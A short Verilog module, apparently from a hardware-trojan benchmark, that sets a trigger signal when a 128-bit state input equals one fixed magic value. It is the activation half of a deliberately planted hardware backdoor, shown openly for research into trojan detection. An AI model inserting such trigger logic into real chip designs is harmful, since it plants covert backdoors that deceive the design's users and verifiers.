`timescale 1ns / 1ps
module Trojan_Trigger(
    input rst,
    input [127:0] state,
    output Tj_Trig
    );

	reg Tj_Trig;

	always @(rst, state)
	begin
		if (rst == 1) begin
			Tj_Trig <= 0; 
		end else if (state == 128'h00112233_44556677_8899aabb_ccddeeff) begin 
			Tj_Trig <= 1; 
		end 
	end

endmodule
